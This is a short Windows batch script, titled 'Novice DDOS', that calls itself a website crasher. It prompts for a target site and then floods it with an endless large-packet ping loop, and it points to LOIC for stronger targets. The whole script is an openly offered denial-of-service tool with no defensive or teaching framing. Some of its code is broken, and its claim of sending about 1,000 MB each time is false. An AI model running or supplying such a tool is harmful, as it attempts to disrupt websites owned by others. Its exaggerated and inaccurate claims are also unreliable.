:A
@echo off
Title Novice DDOS 
color 0E
echo Welcome to the website crasher! This app pings websites to death!
echo.
echo For example, type in a weak websites IP or their url in this form: example.com
echo.
echo This ONLY works on weak sites and does not work on strong ones, you need a more powerful app for those, like LOIC.
echo.
pause
cls
color 0E
echo Enter the website you would like to crash 
echo.
echo Warning: Puts in about 1,000 MB Each time [1 GB], Use at your own bandwith risk!
echo.
echo {Admin Note: Similar to downloading games, except its about 1000 MB each time!}
echo.
echo Keep in mind that to make this actually work, you have to have this running for a nice amount of time.
echo.
set input=
set /p input= Enter your Website here: 
if %input%==goto A if NOT B
echo Processing Your request
ping localhost>nul
echo To end Crashing press CTRL + C
ping localhost>nul
cls
color 02
echo ----------------------------------------------------------------------
echo Now Crashing Website...DO NOT CLOSE THIS BOX!! DO CTRL + C TO END!!
echo ----------------------------------------------------------------------
ping %input% -t -l 1000
